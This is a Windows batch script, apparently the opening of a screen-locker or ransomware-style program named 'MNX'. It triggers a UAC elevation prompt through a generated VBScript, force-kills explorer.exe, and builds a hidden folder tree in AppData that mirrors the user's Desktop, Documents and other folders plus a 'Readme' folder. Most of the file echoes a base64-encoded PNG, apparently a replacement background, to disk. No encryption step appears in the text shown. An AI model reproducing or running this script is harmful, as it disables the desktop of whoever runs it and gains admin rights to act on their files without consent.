@echo off
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else ( goto gotAdmin )
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"=""
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    rem del "%temp%\getadmin.vbs"
    exit /B
:gotAdmin
pushd "%CD%"
    CD /D "%~dp0"

taskkill /f /im explorer.exe

:MNXFolders
md %appdata%\MNX
md %appdata%\MNX\Readme
md %appdata%\MNX\Desktop
md %appdata%\MNX\Downloads
md %appdata%\MNX\Videos
md %appdata%\MNX\Documents
md %appdata%\MNX\Music
md %appdata%\MNX\Pictures
cls

:BackgroundBase64
cd %appdata%\MNX
echo iVBORw0KGgoAAAANSUhEUgAABQAAAALQCAMAAAD4oy1kAAAAAXNSR0IArs4c6QAA>Background
echo AARnQU1BAACxjwv8YQUAAAHFUExURQAAAAQAAEkAAAoAALIAAP8AAM0AAD4AAEUA>>Background
echo ABkAAC8AACQAAGgAAMUAAHcAAAgAAOEAAK8AADwAAIAAAF0AAPkAADYAAFgAAGIA>>Background
echo AI0AACEAAL8AAJ0AAEIAALsAAMAAAFAAAKIAAE0AAEcAAIYAAPQAABUAAO4AAIQA>>Background
echo AB0AANIAACgAAJIAAMwAAOcAAKsAANUAANoAACsAADcAAIgAADkAAG0AAOIAAKYA>>Background
echo AJ4AABMAAJkAAGEAACAAANcAALgAAEwAAEAAAGsAAJQAAIwAAFlZWWFhYREREQYG>>Background
echo BmZmZigoKFBQUP///3Jycl1dXba2ttvb2/X19ff39x4eHi0tLdTU1Pv7+729vcnJ>>Background
echo ybi4uAsLC6urq9DQ0E1NTZSUlLq6up2dnaenp+rq6n9/f8PDw6Kiot/f3+bm5pKS>>Background
echo knl5eYyMjN7e3m1tbWtra0BAQDIyMjo6Oj8/P6+vr+Li4mJiYsHBweXl5dfX10dH>>Background
echo R4iIiDMzM7KysoODg8XFxXNzc3t7e0xMTNPT05mZmZ6enpeXl+zs7LOzs8zMzL+/>>Background
echo v/Hx8a2trR0dHeHh4cjIyIaGhn5+fmdnZ5ubmxgYGKamplRUVHZ2dgAAAB6hl3gA>>Background
echo AACXdFJOU///////////////////////////////////////////////////////>>Background
echo ////////////////////////////////////////////////////////////////>>Background
echo ////////////////////////////////////////////////////////////////>>Background
echo /////////////////wDxn5gTAAAACXBIWXMAAA7DAAAOwwHHb6hkAAA640lEQVR4>>Background
echo Xu3dvW4bx9fHcTUGXARP6QAu0roKggCpnAsQCLBjyYIXwBugWBIgeAPk/T6/c+ac>>Background
echo edmlJMqWbP+j7weJyd2dt53dOZrly/IOAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>Background
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>Background
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>Background
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>Background
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>Background
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>Background
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>Background
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>Background
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>Background
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>Background
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>>Background
echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAH5VH+MRAN6bPz78Hc8A4D/n05NzvL9q>>Background
echo APz68eNnPdj/L/Pbnx8+/Pl/sQAAb+TLB/PX3Sd//PCPVv1hT373fz98+KR4V579>>Background
echo WTL48u/xVLGqbAy2/h+VZj5bFPvw4d+Pf/iiaWWK1/x7rpM/stQ/lekjE0kAb+6j>>Background
echo Qo9Hnn/05Kuv+vTF4uDXv2ugU5TropEStpj214c/f//8u5Xx+bcvH2zW9ptH0buv>>Background
echo Xz7YRPH3L33WrkxL4ZM8X/f58+d/VYnX/48Xo5JbLQDwJhTPckr2JQJgCYSam5UN>>Background
echo d19tjlhp6hYJ5YtNDD9/8fnh5y8Wsj6VEPdHRLpPbeoorUyJKZ/W+VWywqiXEkk0>>Background
echo 0Xz5xTMAvIQCTXm5rUbC30q0+6sFwC9dAFREa9O4r18sibZ7lPvdImddFUHynz9r>>Background
echo tOzLlAiAdZ0iodbYFbflUFTNWgDgbcT0zS90SySczMw8SQuA//ylhLlYYqUmbaWI>>Background
echo vyyS+YXsxzpL/NxfybYypdVTAqCmgLp6VgD0rMNLjQDwJjIAaQZYXq77u8SjNlsb>>Background
echo AuCX3zW7y+mdv83rM0Bf8ckW/SXAOq+MgBiGGeBfJcDVdcpj1cRrgAqzLSkAvAlN>>Background
echo vDwS5Wt7n+JFuzozswBYp3GfPnioHCZndRLZaFWm6cNYK1PqDNAvmj3ktTh7pUwA>>Background
echo eG0R3j79qQBkIemfCHbXZ4C2NaZqlbbPPrOiIPnh79m7GE/OAIe4+jfvgQD4ATQF>>Background
echo 08zvt7/izd6YmLWZ2RAAfaumd2WpuDpb02Tvw4d/YyG1MmXyWuNnpfcV5o8r0RMA>>Background
echo Xl15+1fhSLOur3ef8zU7zcyaDIDlPV7l8Ff6Qn0NcGBzwA8ffoul4okZ4Kd20WxX>>Background
echo w1z/AvgR/A0Li3sKWZ/vPuXVrGZmHz+7j20G+JsHJuXoA1R9F3ikbDJMAnO259oM>>Background
echo 8K9//1TaP7vJIfEPwI/x94e/Pe4prv1z90/O7dpsTTO8fBPkr7JVc8UWrWz77DVA>>Background
echo 55PAftMwA4wAqHX/91F8IeTrkADwxv5VWPK4Z5ey8SEYn5nFU83wYgb4+ctf/8pf>>Background
echo mq/lp1zk6muA7uufioDd1XIrU+ISeJgVhn+60gHgDdkHYXw6phnbx/o1t2EGGAHw>>Background
echo 979trvbx42/DxO7au8AZ01RkFxyHGeDs84ZNnYYCwNuyAOZvfSiu/dHe773yLvAf>>Background
echo OTPTFLBFrSszwE81gmmC194g8VcZ05fydJgVBgIggB9FkzB/0U1TvXbB2mZmNQCW>>Background
echo 94CNIlm7Sr3yLnB+mtqml3VO6dnqO71fY/21GeDH2RoAeBua+ZVw1r8e154rAJY3>>Background
echo Jcp7wGZ4H/jKu8BxTxgZPtHSf4Q6Cxs+GwgAP5jiUolBv3cv5l2ZAcZ7wKa/Br7y>>Background
echo LvCnuuaf4SOD/lFD9/lLhMhrM0AA+GG+xOXopzZB616by3nb5+6rav2bGwqQ3WWu>>Background
echo 06SwfJVj8pHmj8rm6z9+yZr6WWfQjJSYCOAH+SejUU7L7v7VFO/Dhz8Uhz7ZR1k+>>Background
echo /P3vV0WqD3+Wj+vZr3aIz+3K9ohr6fPfdlP7f//9czo39E9H//VHfVvFPlFTi02a>>Background
echo J7ZADABvqv7O0e85k/tavgRiT/PZ189a6RvbuvZ8nAJ+VYFff/v339+GsOg+a/U/>>Background
echo NeB19TQKtXwQEMD79JUPQgMAAAAAAAAAAAAAAAAAAAAAgBudF/fxDP9rzosrB2+1>>Background
echo WMQzAM84L5dtvJw32+XShlR98mpWKnBjT07l4fVr+CnWW+3GLha0lwft1iEWHrNe>>Background
echo mrbvR1s8lNWR92LPT3Zw3ClX+bOkDNapYyeqn1XeQyyZk2c028v/focDr0qjqA2q>>Background
echo 84OGiQ2S+uTVHFXc6Xjv4/ii5dev4e3sH59SLRZjALTF5wLg3cpC3joWPMqdrCd8>>Background
echo dZa1Xu7tYaVVR19hq6zjqpMt2t+VoRePtvY0tMHKvez3ewuYrakAyvSjG0GaLpSl>>Background
echo +uR1rDUkFfJ29k9MOV+5hje06+ddU4rofVTZ3RAAbdeX23iuSWRm8dXRJ5eo08Jj>>Background
echo rDoOBWuDrVd946zQytXKvk0q1xcX47EG3r2zXUV1EwuNldX45FVoInOxUKHhF5fA>>Background
echo r13DW8pgdJWH9UZx6YYAeNLfnXMsHFVCBEAdi8xd66xT9LXmzx2t9xXHGjPNscws>>Background
echo j0MjMgDak2ESCbxz643CUkQkcyqjqnvyKhQWNO1b+FVdet0a3tLpqQD4TTPAg8JX>>Background
echo JDtvNTGLAGiro7SHPCh2EWyrdkM1Xq9N9u4VSls3ln62vu2jYg2AyvPUrgDvzfFi>>Background
echo A6wNljote935mUbebOrxujW8oXP/F2JmEgBvmwEeFCcjRK3teQZAe0WirG+zTot0>>Background
echo 94qD0w48lBf0hhmgAqhPLPXYNaoGQDXuqV0B3pmzYp8GSxtbGitlONUnZrU3WrYn>>Background
echo vnp12GxmH8HYlau6/WJ3t3rYtHcOVjtd5V32Zf63W8TL/60GJa6p/fn93TBXvDuv>>Background
echo W21D6X3Oqlu52mnWacutvFK+qSVNd09NXFg6jxp7tf2k9Z5lUuFeJU0ugUs0i88W>>Background
echo zfutKJGuZDvuasw8rS17Weguu5X0cLd9JHLtM7PLUDcc0xYAFUsjcdejsz7yfcxD>>Background
echo 0B9opby3nFbYPvqh7GJ5UDJfkJcdMeDnWGuYacy1waaxcmUGqAVR4LInNoTWy+0i>>Background
echo Rv4qXsTXomWxtyUVMGwhh+DeX9tabm3G4iVNargsj5d1XA8/LDc7e7uyv1Jbafui>>Background
echo zGkmpfc5q7bSU6/tpf/aGJsDLbYqqi9p3L29/atrSD1obrWzz7mo7TEv6ytUOFFp>>Background
echo kwCoCtZqa+mmseCSwCjS5T7ujvf9DNDWe3ldAPSg2P05GswudqOdkwBY/jTpia+e>>Background
echo 9ujQR8Mh6A+0AvHysrGE8Zkdi8n+5LSz1cfDnT3qML/wiAE/ycn+GMer6S5HUHtS>>Background
echo aNGH+d6Trv3c18WzrdvpTPcBrFPdNupkPx03Pm2pNCDzz36kajVc/LUsjTQt7cpw>>Background
echo XvVXairP1pUEQ+l9zmpYqdixVcRTC22lhydrsn0mZyhp3D2lssUMTMfamqFs7dPG>>Background
echo praRNVi0Wh7s0zAeTsaCkyKdai9debDqSldZALT5nhVfXwMUCzLXZk2rxcNx+dAX>>Background
echo rMy+qGaVIl02Qmu9G8YenfTRcAiGA+0pPR4uN0d/KAk9X4bci+p94REDfpL90WYG>>Background
echo B5+kFBorV2aALRj4xEQLMbp9DGvR82cWnesbG7RlQuG6Gcm0Bg0g21Qe1jH16+Y/>>Background
echo mTeLaKUPOdO40kKZhQ6l9znQ0cvX2LWNXTuH3atL0cKSSYay9a+tVtohAGaN8dLc>>Background
echo WHCySKfCvRG72n8lAFqBeuwzqCpPO2Vz7+MQGbVL3rnqLK+2sKr2ewvKJfCMPTrp>>Background
echo o/4QqC1ebxxoS6lH5bOPJiq973jJpzZ6jSc9H8vv+nnoQOBnu/hnbHVe+99+o7Hi>>Background
echo YyTP+SoGz8nOeZ3Mvk1nuC0qfzn3Y7VOeK0+92EhQo6pBccTbfKUihit5Ltu/qME>>Background
echo VrxqyeEUpQ85U7dSJWkE+3COwaqNNtQz9tSSxt2rO1Ry3dcZ4FB2lBWlVBa/rKSo>>Background
echo cSw4WaRT56lpZ23N6u62Wauy9jNAW+WlzClvl7C+JazGlSKd9tdlI2Jr9Oikj/RQ>>Background
echo qlK5+TwOtFJaPi3ZnsfKXFumdXs7FGP5XT93HWgPwM/lUw4/Q31+JBorw/ys0umu>>Background
echo s9nGq20rw7GNIC8ns5TYMyi53bQGPXhqX1S6YyasHrx01RLDKUsfcqZupR4ztoyD>>Background
echo Wxdi9tC3s9+9ukPR6joDHMrWPz6Y8zGoRi8k93goOFm/27Tu3q6Aa3Xd4djeT2eA>>Background
echo kWRG27qUyupdoVq79N5EraqNeDjYs+jRSR8pXT0EkwMdDwpjdrooYdnxo/8lUyXa>>Background
echo aFfAk/K7fvaOK4/tiAE/yX65cd3w6uZn5VytfB60jklPOaNj5OYIiryahnRDstCY>>Background
echo 8ZxSC44nejhFI7SoJc1p+oji9gddv3kRbT42yRnGlRlbYnBHlcXYzm736g7FTKbW>>Background
echo OJSdZUXRSTV6qVnGUHA62SWvMh7uLNbUpBEAtbw8dDPA++PBVrWWD9SOVn8ePrXc>>Background
echo Y09RkujfUr5bHRQsvUcnfWTp8hBMDrQerNSIfDmdKxn3OkBqcp3ptvKfO2LAT3I5>>Background
echo LpxO5e5v9DA/a3San1clWY6LGLk5gDNLO+ErjZkckNMaNE4uZzXivDhboQ82bibf>>Background
echo 8D9vNSBj9Cl9hq1JziJXaq1WZtMOZbBqY7dTQzu73ashIVpdaxzKzrIybgTV6KVm>>Background
echo GUPBySOdUhwXFgiykRkALcty04KzfQVEndVF654aGdkkO7frb9FaNVH11bCjHj3t>>Background
echo o0cnfdQfgvmBtgwRAOMhdvXhoPz3+9jRvvzWf7UDhyMG/CQ54OzEjEGssVJOzfok>>Background
echo 7XWal4tR/UkvL+H4md/GemR5+QxwrEiDZ3zJq4SYGH1qa5tPxGy1N67MwR1Raqxr>>Background
echo iClt91ouDXG1us1g+rK1tpQ1CYDqDC81yxgKTqXjVcLW0mb/lYmhsQhUg7N/BUSl>>Background
echo 1B4s9qfSRzFNLbIxY6O027H3scNDj2b1XZ44BFcOtLUhpn51BqiCt/fHezXxUq6A>>Background
echo x/KfO2LAz7GqJ7xO2BhEGiTD/KyjNTV0lfM4znA9TN4FngXAbkYyrWEYq+UzHfbZ>>Background
echo sUxeh50eYjhl6cqZL10248rJ4FaV3cZxptp2r89lyWuNQ9m5H1F0Umd46mzuUHAq>>Background
echo AVA5fc+y/9ofJGVufVjugaAeHIOHgqQn0YbM1vpZdXaJY7ftpURvqorvelTVZ3Ns>>Background
echo a38I5gfaHlSJJYyH8uygtpyWp3IFPJb/3BEDfo6H+lacTtWYctWRM/9jrURxIus8>>Background
echo 9m0xBLTBR1DmHQOLy4EpteBI3jbtVnfr8lRD1UZQEek0+mxdm4+NOVO3Urkmg1sb>>Background
echo S7l7WzsGau1FFpy5NLPRv1Hjw7SpMf7VvIgDzrrSHtv8qCs4lUhX3gbxBL7cAqAV>>Background
echo nnnss+pGAa9uNsrsSZQ0GiU23bTHWWz3tiipH+axR7P62KF2CC62yhLajtsmpbSN>>Background
echo sxlgTE+VqpxFLztiwM9Rr7h8dJWTWefuMD/rnfKEj4GgFX7CR7zQQ8lyZQaowZKj>>Background
echo dFZDvtBkL5Sty1ONqKhK1DZLlwO9K73PWQ0ru8Edc6ASfdcqvhuY7lRnJ8plVeZw>>Background
echo 9Rr9KrYvO4re164rshe6D/u2glP0vKZM9hD9p+XyYOpe7koIKo3KEk1EmWyTfStP>>Background
echo Dp5v6D9PWhbVVtujsUez+gyAsYu2ND/QthjhMB5M2e4x09x4xKLJwE+xj9mQ0bla>>Background
echo zszp/Kx3qTPGMro1HnwE2ATg4N8M8LxaHAKL0WDJymrB3fWVpV9YYfEp3PicSqEM>>Background
echo GqAPuibbPuyG0vuc1bBSC/3gtkdbXlsKlVQHpmm7p1zbZfsui4WNdRbXyi47ohKH>>Background
echo 6nfLjQ17FV57txWcItJdShp1TmlIFwBVjD8uog2iZnS9YsHJ6o09sybbRtWrxfIF>>Background
echo jqoGQDtGetb36H7aR3EIHnwiOx5oVWkNngfASynhVI9sK//xI5ZNBn6Clc7S5bYM>>Background
echo UjtVZV1e/LbXnOqTXlwcmcNyq5iQA+Dg2e1eTtuDfz0hCw4L+9zD0b8D71UdN/d9>>Background
echo DRpJdldC23w4bhVLxy+L2tRH40YTNg0Y/zhMLb3L2cRKa6xFp+VptbLH49rKtKZu>>Background
echo /YsMY0nSdk81Hu4eNofYPSuwjPCxQvXgZrtVicfuczuX4/1luXnob8jX9Zvz1ti6>>Background
echo lQWMnfbLl+tq51e+3rFbX2exyxZax1gwUZQ+et2W2TepuE1M2IId6NxTq+t47nr0>>Background
echo eD/to3oIbBI3HGhvzaZkKN8GLn0qpRH52cXbjpgV0DUT+KH8/h3x3J7Wm3n42vqk>>Background
echo uOgM9g/5p/GmHufN5qDE9gmHdgeUjq8qpfkzG1v+JGootx+R1f3d3m4/4mvTal1i>>Background
echo 0YPSTEuvOXu1bXGrkr6u1WFj17+5reSd7F7OidI5spi+woU/t091xAqxX+NYle6Q>>Background
echo Wb+52hjn7ejvpFL4z3rkpnzaJ/D6NcNyijk5nX3oWmvKjkbG8qz1aG7O8rU8HoLu>>Background
echo QEdKf8gjUbaUxuqa1h/68p84Yl2TgV+b/ciEfWnhP2qyez4DfBU/rt9W/3tvr/4P>>Background
echo NhnvlK6INsPLSv8t4+4tdNF4nM8rv8V/vN+Ad+I8+TLXf8ywe2v7ttb863jf5D/e>>Background
echo bwAAAAAAAAAAAAAAAAAAAMAb82/0Vxf7juf22S98le/Rm218ufWVncbbljwl2rK7>>Background
echo s9uLmMktBh7zgire2Np+Y/2Zz1fPWnvTcfpGtzToFawOb7cLwG1Oy+1lb1FwsX+w>>Background
echo r7r6z8Q+e1aujgo0+/3e7t3yeqdw/dK8tefGOBZtKU8Py+Ot8fhFVbyCum9zC+vy>>Background
echo p+NN19oo6Lbj9G1uaNBrWL3hLgC38du7ae5kN0pa+W04bvrKv+ZdZYScX/HeHbt6>>Background
echo 4xILyPH8ebUtd6fbm/KyKr5f3bdrFN+ejjdda2tBr3drhrlnG/Q63nIXgBvs/Y5t>>Background
echo +7gj78VuxDa96dNVLehorLzWSdx+8/ZF16e1LXHT4tv84Evg/vd8ZxTfnok3rbW1>>Background
echo oJuO0zd6vkGv4i13AbjBgw8nmwH6ov14zctmgO1n0L7fCyZwvWyLh+9f1ZP79pIJ>>Background
echo Vy2IGSDwvc7+mplmgOVeyzud9i+cAdpgaT8i8j3O3zgni7Y8vP6YXb3aPfue3rcX>>Background
echo xJtW0FtOn35QAGQGiF9CnQGa8md5tWivkI23eXZdANRZXMbkmKzdInm/2Nm27qbQ>>Background
echo 9kQPu8V6Yem8JHsP5qT1nkVb/FFJ7S7EMbNb7RZ7r2V8p6O0xX8mt6ptmdZZ1So8>>Background
echo 6f3dWOZ5rZX1h426PZu3odvYdtV4GV7lsG9DBstyP1xxlgaXB2X2hdravqD5cQqt>>Background
echo 3uaRhl3r0rFBk/6/t8y2ad/vgzxybNRMv73p9axlF/yn6ou+a4YmA29olTNAo4C2>>Background
echo tp9/rWPgsjxexp/jGALgqryDMiazqLjYKo2XdPJPqFyUSTSS7clhb/+ells9KP/O>>Background
echo Pnqx3G6tKE/nPz1xt15u7WeVrC4vab2wbeP7t0p+Viv6da0tXlatMzb3VTwsN7v9>>Background
echo Wi3x9YWau7ZYs1tvxj270obJxthV65bjZVF+NqPft0k/aaqlnuoDoP+0xmnnP5dy>>Background
echo uLPH7S5bOxQ0O05FV296tGFXd0dag/r+15+D5cXapX70VrZJ7bSglf0CjHpbWa3h>>Background
echo j2W1XfDFODCP9SXwpnSiDTNAP1W1Lgasbet+ztFoSOYIixcBh2Q6s23z0Tao8NMx>>Background
echo fksts+19/CuVLeYrQd3PUer099rKz5j5TzGKEm4VVzVkWmvFC+2H49iWsc4qqtiV>>Background
echo RKs+u7LYkvL70lDatA3Dxm5X9dTWxIZu34YMCjebnUcJb6KzPyh60CYf+hfvm+yQ>>Background
echo rqDpcSom9YZHGzbfnaFB8/73eLjcHP2hq6IryMvVk77h17NqrZLZp2HKrj7Sl8Db>>Background
echo qq8BGgtLW03ddO7ZaR+/6hoPqQuA9pNiKztfu2TlJ191opcFDSMNCD3XGe/nc3kr>>Background
echo M5dUmE3Gut+JjTVK4JXGL2Vay+yKSGX1PxuhxP5bcp7UjE0e66yiivi1x2Gr6rEc>>Background
echo ymjVjKVN2jBu7HY14leGsbpvQwb9a6tVURcAo2htK53juxqt7TtpcpzCpN70WMPm>>Background
echo u9M36Er/61FZ7efzlKWrtyvI1yqrX7RHw69nzUzlQwhD1/RNBt6WoleZABg7++10>>Background
echo j/ClBz9ZdZLaQ9B5Xc9+H4E6tTOZv4Rk57USWQllhJ59c0wQ7N1mP/99jJfxoJlk>>Background
echo nYXFiNMGe8jC1TIf/Tl+gqrxi7bavq7Jln2os5pUcVfrruNezZt0gFJO2jCpqu2q>>Background
echo Nti+qQzribZvQwYt2NbIllSFZS0zofjtuPyx5K6TJscpjPVW1xpmuea70zdo3v+W>>Background
echo VUuWKI94MSmoHlsdHCvietbchZJJlfvaWV8Cbys/B+jy1NVZakMkzmB7LHMQp6V6>>Background
echo ZupMve+T3efA0SVNOZNb4aXQc1kRoyJrms8A84dsY7Rmy3KQBSVWMrUi3tUY2zKp>>Background
echo s4oqtLH96G5owcFG61japA2TqrpdffBkKsNLr/s2ZNA/viP5GMp8XCuVtVwB28KV>>Background
echo GWDfe2msNz3WsPnuZINsQjjvf3tQoLKNqrdr9KSgemyj4dezaq1XUHZBSVvXDE0G>>Background
echo 3pTNAOvJlqduzAZ0Op7sx4Dij3XQ2jz7lbmM5ZYsT2WnSUsNbHZaawYTvwiUg0Y1>>Background
echo 2eMwAxzGQDQpWzYPgFpUYbl2aIv0dVbZRj1qAtmXZxmsnpiRjKVN2jBu7Cexsvcf>>Background
echo /7aB3/ZtyJBtmOyQL+6VV3li3popu06aHKdOV2+42jDLNd+dvkHz/rdCI3xF94RJ>>Background
echo QfXYxtT1elat9VOjJH6yL4G3s+r/2uapW/4saxAsL/bL5ufFuSbxkzXPfp3Fyqxk>>Background
echo SuTpfKGbLQ5nsgbIeRWV5aCpNU1ngNmsaFK27DAMvWyLSo5ys8nelrKl1llFFRqN>>Background
echo Sq5Y028u4zTaPZY2acOw27bYYv15q7gaA79tGErTgrcho0bwfnk4qIr7fTS7tvbZ>>Background
echo GeBYb3qsYfPd6Rs073/LE1EsHkIWlLuSxzYafj2r1noXl8RjRw9NBt7S9DVAP3Vj>>Background
echo YOWrT6MIOqbM37SiJRsW7uLPfKGqDuUirA0a1aTZSP8nvxSgNaVZ0aRs2SReZFs0>>Background
echo gErB0yb3dVZdG/0tlCFALrScl8ZjaZOBPu5pvwslgZLbRKtt6EvT2pJ7skNKtL0/>>Background
echo 3qvZl7gCrvV0NXTHqZ8BDvVW1xpmuzd26aRBWpz2vxUa87dbZ4Be4vWsWuunRkk8>>Background
echo dnS3p8Dbmr4L7KeuzlIbIjqj/X3IUQad+jRPfKdVXZ7xTNa2jBndoLHk3Z98JbJ5>>Background
echo Qw6JGK3ZsqGubIBHgjp8xyZ3dVZRxYOvt4+dlXDn1n3+sbRJmydNabsQI14PXm7d>>Background
echo MJQWbZiWYntyUPrT8pTv3GTKrobJcQqTetNjDZt0aVYTE8J5/9uDWmcb4yFkQTk7>>Background
echo V/mTd4GvZNVab1ZpzNA1w+kAvKnHZoA2UvRgp67syhB0Oq/j7NdJbPFtSBZZVbCV>>Background
echo NJ7JKj7jYQ4aTXj0b/zJfyhrfORpSPgAjAGTLZvEi9oWPfGauraUsNfVWWUVJeUq>>Background
echo W2wUUo6HxS6+0zCWlm2ONgy7bbua9agtVnwM/LZvQ4bckdabhY6HNUdpc16aoajr>>Background
echo pO44RYlmrDd106mWIOJgvzuTBmnRa1UVtqjEVuhkGldMj007tt7waM8kqzL5eVeW>>Background
echo H+1L4G09NQPUiVhG4fAqWh2yihxlfZ9MK0t5ayWaXsuc6t95nf82PcgT3wNluVRV>>Background
echo 8TYGYsRp0cvOluUgC0pcSlS1jzS51VlFFXEHGYWcrkhV4La+bigtB3rOdMaqWqyP>>Background
echo V9NU0mTf+gxRWP3KXVV2OD8R5yu8uL6g6XEqJvWmxxo26dJokHVkLHoprf9tMcJh>>Background
echo PITpsYmStNqri5ImWXNrfPb5sb70b+cBb0bDvwXAOHVrXNJZagFs0Z/uNiBtcaU4>>Background
echo EHPHIZmGgZWxtjUqvJ7J5lInm8qyXbYP++vJZV1qUfHenjIylM7XZstykIVoi2iD>>Background
echo P501udVZRRXxQej4xE6wFwW3W7VnXpoWhjYMG7WrtmBUvNI9WEEPe/sjkPs2ZCiN>>Background
echo yGY3l1LJqfSCPytPu4K649Qmr329l1bmow2b7s6kQbP+t5omUayYHhvVuDz4dz68>>Background
echo 4SriStbdcmPnmNL6HjzWl1rfHx3gVe00GKRMd/zkty/c26cRynujOl0VqPpR5mmO>>Background
echo nm1bVw/JFBjtbQR7ZslaKmX2sGp80DxsDqViL8BH0YOG4fLodR80jnNMlZatVvZ4>>Background
echo XOeI8LXe+NiPo+qaNrnVGWoVa+3GYVG/m+tUpF/+nmMSEqVZGfM2dFXZF2BzV7Vv>>Background
echo srGAZYO37tukbWrGZrtVbx3HT+L4bRrr11MsXEWH1IJKS/rj5Cb1Fv0x6BIc7+e7>>Background
echo 4w061gb1/W/HVBk9T/lK7+QoDAX5mqW9lb09PJb1cry/LDcP5VNH8khfWvq6L8Br>>Background
echo szuOxC1GcqE9GrtHR38GljuWmFhR9MlWh41d/2basvqiMzq+2mBy+pHOkaWvu7s/>>Background
echo SNwnZWhZbYs9Lc/KltqWSZ3JU+ryS//t7IYnsdpo7hHNeshJSG3EtTbUqvpdvVut>>Background
echo S2R/KNvqvknfTwt/bh/9iBWFvxKqSz9/GKrLgnJVPqZJvW61szSzhmWLh0KsQfo3>>Background
echo GzTvf3+4r1mLKwWdNxv7wRj7YMtjWW0vVyVZuNqXitnDNQTwv+lkf/5bzPMZ4Fub>>Background
echo 1HmD9qnIOjXBT7WavYIL/A/SleYmX9jRLEOXW8dunvI2xjpvYh+N3lwedHH5wowA>>Background
echo 8Lhz/4W0tX3vafIltDcw1Hkju2XoZjN94RAAAAAAAAAAAAAAgF/Hm3/kCAB+UXFL>>Background
echo AwATsw/jjb+3/dRSeCLJ1fSPUeJF+2YUXhEBEP9x9g3/Yvuiy53T5Btfq+3yuFyW>>Background
echo 76M+vRSeSDJNrwU52ReBjdXszfZPHdvdQ7bH+jNF8eV553cB+O6vhK4eNtubvt+m>>Background
echo ZvffA2k9e9xkfC6/Hnyrl6V+zNp+Gv0bPztebnxzVgeUG7Tkk/8Zq42azKfT8Tj7>>Background
echo kdjLfr9X5Ohvb/KU/WIz+0ru0U4z+xLts0vhiSSz9AtFEa0q4a00chc/6HZaHi26>>Background
echo 2G2Rygbbnzre1+UeLd8m7iuwt1/hHtt+nf2m+6nrw+xZu1NWyW8R2fejFv6ULvX3>>Background
echo WFj7vzEAlntsne2PjO1XfXKTG3bxze3ty5O/QDvw69IZ4sNDJ7fdi+p5D35XqzEk>>Background
echo rP0ef7so6qml8ESSK+kV+MqCYkoZgOfyqGs0X7QtMdezmVdeuE1+2fxldplZTbkh>>Background
echo AK6VSH3Y7WT2rD3xSGbxI0ZjLfxxXervo0jateolzhGBtQOlR+uTG9ywiz+A/jS+>>Background
echo wl8R/HfNhukNZiHhWCZkcS+Up5bCI0ns4Ur6Wp8iYbnNRwltihF51w+N8hisXXj+>>Background
echo rgBYM0/vwXWV34tZjejiQ+1ZbSshuV3U3tKy17kE9l76xgC4aqeG3Ya5e3KD7+r8>>Background
echo V6NThwCIJ9RhqtH7/DgvZrfli7mKLkifWOpeUH80yfX0+4wgtY0nT3OsE8D2/HSw>>Background
echo C+WySw/fE0FOOYBvmgGWZg/vxtSetVuJdoHR1MJ/gG+fAd7HIYif6eie3OBH7uLj>>Background
echo 8nQCrqvDVKfKrafsNCTkxKw8PrrUhuGjSc79QkufjdTKMib9/sdqsU8WXeY7HRQL>>Background
echo M15+xxg81/mXqnk+ANYZaFN71oLzGDda4T/AtwfAu7h/s/bkyRng6srtE3/oLj6O>>Background
echo GSCeVoepxkk5Ze3OTv6WcL3Hrj3pR/A0JHTxSX9uH11qZ+ITGa6mz/Bi73BYQ84e>>Background
echo UEruoCTeptPaTvryvA+AcVNhf1BmX7DVdnPn3Lf9Ymfv+qrQva4bT5GkhPv5R3O6>>Background
echo rKud0l9K8ir3xLqr9Oxu4QG7L1y62z0PrYnUKlwTS7vP8lh8qEfrakL7caDhEnh+>>Background
echo TIc6087/mCTtSUlQnySvvf5EU7sZ9GQXX1pvOxBNS1/KKg9a4QuP9ZL63s4cSxPV>>Background
echo ZhvnLcJ7pHO6nHQRcVbL42Wh5zqjtUk0Cu1JH/GmM8AcFyVOPbUUnkhyNf2qzE7P>>Background
echo W4szerL2yKakbWTrTC8r1TI137f0AdDWLU87+0GM4+HOHu1XQdbLrf0OjyW2j7Fo>>Background
echo 0Fqyy84+O7Lcbj3OquS1b+xqky7r3l94VPohQW1ePNGDT6CGwj06LrYlZVdkTe01>>Background
echo r+2N8L5DUne0riRUH6r0LNF5sf0x7XvAflZD67Q4zvSU9uoMUJ21tlC3W8evjxwv>>Background
echo 5bdSxl00L6i3PxCe13XprxxKe6v7ai+VGWD5HRT7e9LaOGsR3iUdfh8edsLptNCD>>Background
echo nbQ63eyhbhxf+tGgHc6YfI1LJ6jWP7UUnkhyNb0aYi242LCwyVS+BFiSOm3xFwH9>>Background
echo E4raYu0fXgO0tyL0kIH1YunWXpq2ZBecjvmbc+2nOTWGfPyUMtOY1YqdzhDVeYv9>>Background
